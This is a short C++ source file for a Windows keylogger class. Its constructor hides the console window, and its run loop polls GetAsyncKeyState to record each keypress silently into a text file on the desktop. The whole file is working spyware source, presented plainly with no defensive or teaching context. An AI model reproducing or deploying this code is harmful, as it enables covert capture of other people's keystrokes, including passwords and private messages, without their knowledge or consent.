#include "KeyLogger.h"
#include <Windows.h>
#include <thread>
#include <chrono>

using namespace std::chrono_literals;

KeyLogger::KeyLogger()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	m_output.open("C:\\Users\\Ckd4\\Desktop\\kl.txt");
}
KeyLogger::~KeyLogger()
{
	m_output.close();
}

void KeyLogger::Run()
{
	while (m_output.is_open())
	{
		bool is_capital = false;
		for (const char& i : keys)
		{
			if (GetAsyncKeyState(i))
			{
				switch (i)
				{
				case 16:
					is_capital = true;
					break;
				case 32:
					m_output.clear();
					m_output.flush();
					break;
				default:
					m_output.put((is_capital) ? toupper(i) : tolower(i));
					m_output.flush();
					break;
				}
			}
		}
		std::this_thread::sleep_for(140ms);
	}
}